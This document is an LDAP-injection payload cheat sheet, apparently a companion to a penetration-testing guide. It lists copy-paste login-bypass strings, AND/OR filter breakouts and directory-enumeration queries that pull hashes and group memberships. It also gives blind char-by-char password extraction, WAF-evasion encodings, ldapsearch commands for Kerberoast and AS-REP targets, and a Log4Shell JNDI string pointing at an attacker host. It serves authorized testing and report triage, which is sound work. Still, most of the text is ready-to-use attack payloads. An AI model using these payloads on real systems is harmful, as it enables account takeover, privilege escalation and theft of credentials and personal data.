# LDAP-Injection Arsenal — Auth-Bypass, Wildcards, AND/OR Breakouts, Blind & Evasion (copy-paste)

> Companion to `LDAP_INJECTION_TESTING_GUIDE.md`. Authorized testing only — **your own test accounts**, **bounded reads**,
> no mass directory dump (Guide §20). The finding is **altered filter logic with impact** (auth bypass / disclosure /
> extraction), not a reflected `*`. LDAP injection is **parser-dependent** — try the set; what one backend tolerates,
> another rejects (Guide §6.3).

---

## 1. Special-character probes (detect + classify) — Guide §5
*What & when:* your first move on any suspected sink — send the directory's punctuation one char at a time and watch what changes. The goal is to prove *logic changed* (more rows, an error, a flipped login), not that a character was echoed back. Get this right and you know which of the four attack paths applies.

```
*            presence/wildcard — widens results / matches-any
(    )        grouping          — a raw ( or ) usually throws an LDAP error if injectable (error-based, §7)
&    |        AND / OR          — add boolean clauses
!            NOT
\            escape char        — \ alone often errors ("invalid escape")
=            equality
%00          NUL                — truncates the rest of the filter (C-backed servers)
# send each ALONE vs a normal value; watch result-count / error / auth result / response length.
PROVE LOGIC (not reflection):
  q=*)(objectClass=*)        → returns EVERYTHING (vs 1 row for q=alice)   = filter logic altered
  q=alice)(uid=alice)  VS  q=alice)(uid=nobody999)   → response DIFFERS    = blind oracle available (§8)
```

## 2. Authentication bypass — Guide §9
*What & when:* the headline payloads — paste into the username field to delete the password half of the login's question. `admin)(&)` (always-true) is the cleanest; the `*` variants log you in as the first/any entry when you don't know a username. Note which account you land on; the first OU entry is often admin.

```
# Login filter is usually (&(uid=$user)(userPassword=$pass)).  pass = anything unless noted.

KNOWN username (bypass the password):
  admin)(&)                         → (&(uid=admin)(&))(userPassword=…))     (&) = absolute-true
  admin)(|(uid=*                    → OR-true the rest (tolerant backends)
  admin)(!(&(uid=zz                 → NOT a non-match → true
  admin))%00                        → NUL truncates the trailing password clause
  admin*                            → first match if the bind/compare wildcards

UNKNOWN username (log in as first/any entry — often admin/service):
  *                                 (and pass = * )
  *)(uid=*))(|(uid=*
  *)(|(objectClass=*)
  *)(uid=*
  *))(|(uid=*

PASSWORD field (when pass is also concatenated into the filter):
  *                                 → (&(uid=admin)(userPassword=*))   presence-only match
  *)(uid=*

# both fields together (classic PortSwigger/OWASP):
  user = *)(uid=*))(|(uid=*     pass = *)(uid=*))(|(uid=*
```

## 3. AND vs OR breakout — Guide §6

```
AND context  (&(fixed)(attr=INPUT)) :
  *                                  → (&(fixed)(attr=*))                    match any with attr
  *)(objectClass=*)                  → (&(fixed)(attr=*)(objectClass=*))     stays single & valid → whole tree
  *))(|(objectClass=*)               → break OUT of the AND, OR-true rest    (tolerant backends only)
  admin)(&)                          → (&) absolute-true inside the group
  *))%00                             → truncate trailing fixed clauses

OR context   (|(fixed)(attr=INPUT)) :
  *                                  → matches everything with attr
  nope)(uid=*)                       → your OR clause matches all

# STRICT parser (ldap3 / modern): keep ONE valid filter → use *, *)(objectClass=*, admin)(&)
# TOLERANT parser (older PHP/Java/.NET concat): )(|(… breakouts AND %00 truncation work
```

## 4. Information disclosure / enumeration — Guide §10
*What & when:* for search/directory features that *show* results — widen the question until it returns the whole tree, then match on hidden attributes to pull data the UI never shows (emails, group memberships, and — if the server exposes it — password hashes). Quantify the excess for the report; a bounded sample is enough.

```
q=*                                  every entry that has the searched attr
q=*)(objectClass=*)                  whole subtree (AND-true)
q=*)(cn=*)                           force-match on cn
# pull hidden/high-value attributes by MATCHING on them:
q=*)(mail=*)            q=*)(telephoneNumber=*)      q=*)(memberOf=*)
q=*)(userPassword=*)    ← if readable = High/Critical (hashes)
q=*)(sAMAccountName=*)  q=*)(servicePrincipalName=*)   (Active Directory)
# alphabetical harvest if results are capped:
q=a*    q=b*    q=admin*    q=svc*
```

## 5. Authorization / privilege-escalation — Guide §11

```
# group/role check like (&(uid=$you)(memberOf=CN=Admins,...))  → force always-true:
you)(memberOf=*                      → (&(uid=you)(memberOf=*))          you "have" some group
you)(|(memberOf=*)                   → OR-true the membership
*)(memberOf=CN=Domain Admins,DC=…    → match the admins group regardless of you
you)(&)                              → (&) absolute-true → check passes
# NOT-based deny  (!(memberOf=CN=Banned,...)) → add an always-true sibling / break the NOT
```

## 6. Blind LDAP injection (boolean oracle + char-by-char) — Guide §8/§12
*What & when:* when nothing is shown but the response *differs* true-vs-false — build the yes/no oracle, then play 20 questions to rebuild hidden values a character at a time. Use `>=`/`<=` to binary-search and cut requests. Prove with a few chars of a benign attribute on your own test account; don't dump the directory.

```
# build the oracle (response DIFFERS true vs false):
TRUE :  q=alice)(uid=alice)              FALSE : q=alice)(uid=nobody999)
# presence / existence (cheap, high-signal):
(&(uid=admin)(userPassword=*))           → does admin have a (readable) password attr?
(&(uid=USERNAME)(objectClass=*))         → does this user exist? (enumeration)
(&(uid=admin)(memberOf=CN=Domain Admins,DC=corp,DC=local))   → is admin privileged?
# char-by-char extraction (substring wildcard):
(&(uid=admin)(userPassword=a*))          first char 'a'?  iterate charset
(&(uid=admin)(userPassword=ab*))         grow prefix once a char confirmed
(&(uid=admin)(userPassword>=m*))         binary-search with >= / <= (cut requests ~log2)
```
```bash
python3 poc/ldap_blind.py -u "https://target/login" --method POST \
    --data "user=FUZZ&pass=x" --true "Welcome" --attr mail --target-uid testuser
```

## 7. DN injection & second-order — Guide §13

```
# DN injection — input builds a DN like  uid=$user,ou=people,dc=corp,dc=local :
x,ou=admins                          → uid=x,ou=admins,ou=people,...   (changes the OU/scope)
# DN special chars to test (RFC 4514, different from filter set):
,   +   "   \   <   >   ;   =        and leading/trailing space, leading #
# second-order — store a payload in a profile field, trigger the consumer:
displayName / description = *)(objectClass=*       → fires when admin-search/sync consumes it
```

## 8. WAF / filter / escaping evasion — Guide §14
*What & when:* when a blacklist blocks the raw metachars — route around it with encoding, the hex escape (apps that un-escape hand the metachar back), or the tiny absolute-true `(&)` that needs no `*`. Apply one layer at a time and re-confirm the filter logic still changes.

```
URL-ENCODE:     *→%2a   (→%28   )→%29   \→%5c   &→%26   |→%7c   =→%3d   !→%21   NUL→%00
DOUBLE-ENCODE:  *→%252a   (→%2528                 (a decode happens before the filter)
LDAP HEX:       \2a (=*)   \28 (=()   \29 (=))    (apps that un-escape hand the metachar back)
ABSOLUTE TRUE:  (&)   ← tiny, often un-blacklisted   |   ABSOLUTE FALSE: (|)
NUL TRUNCATE:   append %00 to drop trailing clauses (C-backed servers)
ATTR ALIASING:  AD attrs are case-insensitive w/ aliases: sAMAccountName, cn/commonName, objectCategory vs objectClass
WHITESPACE:     leading/trailing space, full-width chars where the directory normalises but the WAF doesn't
SWAP ATTR:      objectClass blocked → use cn / uid / objectCategory (always-present alternatives)
```

## 9. `ldapsearch` (direct query once you can bind) — Guide §1/§15

```
# anonymous bind (some directories allow it):
ldapsearch -x -H ldap://dc.target.local -b "dc=corp,dc=local" "(objectClass=*)"
# with creds:
ldapsearch -x -H ldap://dc.target.local -D "uid=svc,ou=people,dc=corp,dc=local" -w 'PASS' \
    -b "dc=corp,dc=local" "(uid=*)" mail memberOf
# Active Directory high-value queries:
ldapsearch ... "(servicePrincipalName=*)" sAMAccountName servicePrincipalName        # Kerberoast targets
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName # AS-REP (DONT_REQ_PREAUTH)
ldapsearch ... "(adminCount=1)" sAMAccountName memberOf                              # privileged accounts
```
> use this to *confirm what an injected filter would return* once you have any bind; for AD graphing use `windapsearch` / `ldapdomaindump` / BloodHound (red-team, §15).

## 10. Active Directory attribute cheat — Guide §15

```
sAMAccountName        logon name (AD "uid")        userPrincipalName   user@domain
memberOf              groups → privilege graph     userAccountControl  flags: 0x2 disabled, 0x400000 DONT_REQ_PREAUTH
servicePrincipalName  SPNs → Kerberoast            objectSid/objectGUID identifiers
adminCount=1          protected/privileged         distinguishedName   the DN
```

## 11. Real-world LDAP-injection patterns & references — Guide §15/§18

```
□ Enterprise/intranet SSO & "corporate login" portals — raw filter concatenation = classic auth bypass.
□ "Search people / employee directory / address book" — wildcard → mass PII (+ memberOf, sometimes userPassword).
□ VPN/gateway/appliance & printer/MFP login forms — frequently LDAP-backed, weakly escaped.
□ Group/role authorization checks ((&(uid=$you)(memberOf=...))) — authz bypass, often higher impact than the login.
□ phpLDAPadmin / LDAP-admin web UIs, Joomla/WordPress LDAP auth plugins — recurring injection surface.
□ DISTINGUISH: ${jndi:ldap://attacker/x} (Log4Shell, CVE-2021-44228) = JNDI deserialization RCE, NOT filter injection —
  test the same fields but report it as its own bug.
```
> **References:** PortSwigger *LDAP injection*, OWASP *LDAP Injection* + WSTG-INPV-06 + *LDAP Injection Prevention Cheat Sheet*,
> PayloadsAllTheThings *LDAP Injection*, HackTricks *LDAP injection*, The Hacker Recipes *Active Directory*,
> Chema Alonso et al. *"LDAP Injection & Blind LDAP Injection"* (Black Hat EU 2008 — the blind-LDAP paper),
> SpecterOps *BloodHound* + harmj0y *Kerberoast/AS-REP*, RFC 4515/4514/4526. (Full link list: guide Appendix D.)

---

## 12. Triage rules (don't waste a report)

```
q=*)(objectClass=*) returns the whole tree (vs 1 row)     → REPORT directory disclosure = High (Critical if hashes)
user=admin)(&) logs you in as admin                       → REPORT auth bypass / ATO = Critical
group check forced always-true → admin feature reached    → REPORT authz bypass / privesc = High
stable true/false oracle + a short benign extract         → REPORT blind LDAP injection = Med–High
( throws an LDAP error, no logic change yet                → LEAD (error-based) — fingerprint + breakout first
a * merely reflected in the page                          → NOT a finding
a lone 500 / a built-in wildcard search feature           → NOT proof (show altered logic)
${jndi:ldap://…} callback                                 → different bug (Log4Shell/JNDI), report separately
```
